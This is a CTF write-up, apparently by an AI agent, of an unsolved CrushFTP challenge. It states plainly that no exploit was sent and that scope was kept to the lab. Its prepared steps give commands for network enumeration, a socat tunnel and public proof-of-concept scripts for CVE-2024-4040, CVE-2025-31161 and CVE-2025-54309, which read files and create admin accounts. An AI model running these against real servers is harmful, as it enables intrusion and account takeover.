# CrushDatFTP

## Challenge identity

- **Points:** 500
- **Votes:** 0 up, 0 down
- **Category:** Cloud in the platform context; Web/CVE exploitation mechanics
- **Mana cost:** 1
- **Required service port:** 8080
- **Target file:** `/root/flag.txt`
- **Status:** **UNSOLVED / INCOMPLETE**
- **Confirmed flag:** None

The exact challenge text is visible in:

- [`evidence/crushdatftp-instance-1.png`](evidence/crushdatftp-instance-1.png)
- [`evidence/crushdatftp-instance-2.png`](evidence/crushdatftp-instance-2.png)

## Original question

> **CrushDatFTP**  
> **500**
>
> Kracz Cloud's test server shows suspicious activity.  
> Breach the CrushFTP server and read /root/flag.txt. Click  
> 'Launch an instance' to get your own browser attacker  
> box.

Instance hint:

> Open your browser attacker box:  
> `<per-instance URL>` (enumerate the target, breach CrushFTP,  
> tunnel :8080, read /root/flag.txt)

The observed ephemeral instance URLs have expired.

## High-level overview

The intended path was understood:

```text
fresh per-team attacker box
→ enumerate only its attached private network
→ identify CrushFTP on private target:8080
→ fingerprint the version
→ apply the lowest-impact matching CVE
→ read /root/flag.txt
```

The investigation did not reach the attacker terminal or private target. Browser control was interrupted, the first instance expired, a second instance required HTTP Basic credentials, and the user clarified that only the intended lab path should be used. No live CrushFTP exploit was sent.

## Attempt timeline and blockers

1. Launch the first attacker box.
2. Browser/desktop control is interrupted.
3. The first instance expires; the platform later reports `error while patching instance`.
4. Launch a fresh instance.
5. Direct access returns `401 Unauthorized` with `WWW-Authenticate: Basic realm=""`.
6. Interactive control is interrupted again before the attacker terminal is available.
7. The user clarifies “don’t game it”: do not probe or bypass the Point Blank control plane.
8. Restrict scope to the per-team attacker box and its private lab network.
9. Stop without a private target IP, version fingerprint, exploit response, tunnel, shell, or flag.

## Prepared continuation procedure

These steps are only for a fresh, provided attacker box and its attached private target.

### 1. Enumerate the scoped private network

Inside the attacker box:

```bash
ip -br address
ip -4 route
env | sort
getent hosts crushftp target 2>/dev/null
```

Restrict scanning to the attached RFC1918 range:

```bash
nmap -n -Pn -sT -p 8080 --open <ATTACHED_PRIVATE_CIDR>
```

Then:

```bash
TARGET_IP=<DISCOVERED_PRIVATE_IP>
TARGET="http://${TARGET_IP}:8080"

curl -isk "$TARGET/WebInterface/login.html" | sed -n '1,30p'
curl -isk "$TARGET/WebInterface/new-ui/version.js" | head
```

Require recognizable CrushFTP assets before choosing a vulnerability.

### 2. Inspect the tunnel helper

The screenshot says `tunnel :8080`, but the exact syntax was not captured:

```bash
command -v tunnel
tunnel --help
```

If needed:

```bash
socat TCP-LISTEN:8080,bind=127.0.0.1,reuseaddr,fork TCP:${TARGET_IP}:8080
tunnel :8080
```

Running the exploit locally inside the attacker box may avoid exposing a tunnel.

### 3. Low-impact first test: CVE-2024-4040

Prepared helper:

```text
C:\Users\kingg\Documents\codex 2\crushftp-pocs\crushftp_ctf_lfi.py
```

Run only against the discovered private target:

```bash
python3 -m pip install requests urllib3
python3 crushftp_ctf_lfi.py "$TARGET" /root/flag.txt
```

Use `/etc/hostname` first as a benign control. A `200`, empty XML response, or reflected `<INCLUDE>` text is not proof of exploitation.

The raw primitive uses anonymous `CrushAuth` plus `<INCLUDE>` file reads through the CrushFTP function endpoint.

### 4. Alternative: CVE-2025-31161

If the version matches:

```bash
python3 cve-2025-31161.py \
  --target_host "$TARGET_IP" \
  --port 8080 \
  --target_user crushadmin \
  --new_user ctfprobe \
  --password 'CorrectHorseBatteryStaple'
```

Require both:

- `<response_status>OK</response_status>`
- Independent successful login as the created account

Do not trust the PoC’s final console message by itself.

This path creates an account; it does not by itself prove access to `/root/flag.txt`.

### 5. Prepared CVE-2025-54309 path

Detection:

```bash
cd watchTowr-54309
python3 -m pip install requests
python3 watchTowr-vs-CrushFTP-CVE-2025-54309.py "$TARGET"
```

A valid result requires a real `<user_list_subitem>` response.

The prepared Foregenix route creates a user/VFS mapping, grants read permission, and downloads `/root/flag.txt`. This was researched but never tested against the challenge, so every session, path, and version assumption still requires live validation.

## Skills and workflows used

- `solve-challenge`
- `ctf-web`
- `browser:control-in-app-browser`
- `computer-use:computer-use`
- Known-CVE/version-matching research
- Private-target scope enforcement
- PoC provenance and safety review

No `ctf-pwn` skill invocation was recorded.

## Tools and services used

Actually used:

- Point Blank challenge UI
- Per-team attacker-box service
- In-app browser
- Node-backed browser runtime
- Windows desktop automation/Vivaldi
- Screenshot inspection
- PowerShell and HTTP probes
- `rg`
- Git and GitHub-hosted PoC repositories

Prepared but not run against the private target:

- `nmap`
- `curl`
- `socat`
- Attacker-box `tunnel`
- Python `requests`, `urllib3`, BeautifulSoup
- CVE-2024-4040 scripts
- CVE-2025-31161 scripts
- CVE-2025-54309 scripts
- Java plugin/RCE fallback

## Evidence and controls

- Both screenshots confirm the challenge name, 500-point value, objective, attacker-box workflow, port `8080`, and `/root/flag.txt`.
- The custom helper refuses public targets.
- No private target address or response is stored.
- No exploit-success log exists.
- No downloaded `/root/flag.txt` exists.
- No flag candidate exists.

Researching a vulnerability does not establish that the challenge used it.

## Surviving files

Custom helper:

```text
C:\Users\kingg\Documents\codex 2\crushftp-pocs\crushftp_ctf_lfi.py
```

Third-party research repositories:

```text
C:\Users\kingg\Documents\codex 2\crushftp-pocs\CVE-2024-4040
C:\Users\kingg\Documents\codex 2\crushftp-pocs\CVE-2025-31161
C:\Users\kingg\Documents\codex 2\crushftp-pocs\Dairrow-CVE-2025-31161
C:\Users\kingg\Documents\codex 2\crushftp-pocs\foregenix-54309
C:\Users\kingg\Documents\codex 2\crushftp-pocs\watchTowr-54309
```

## Flag warning

- There is no CrushDatFTP flag candidate in the retained evidence.
- The `pbctf\{...\}` expression in the helper is only a regex.
- Flags from the other challenges do not belong here.
- No exploit was confirmed against the private lab target.

## Diagram

No Excalidraw file was added because the live target was never reached. The prepared branches are documented above without implying success.
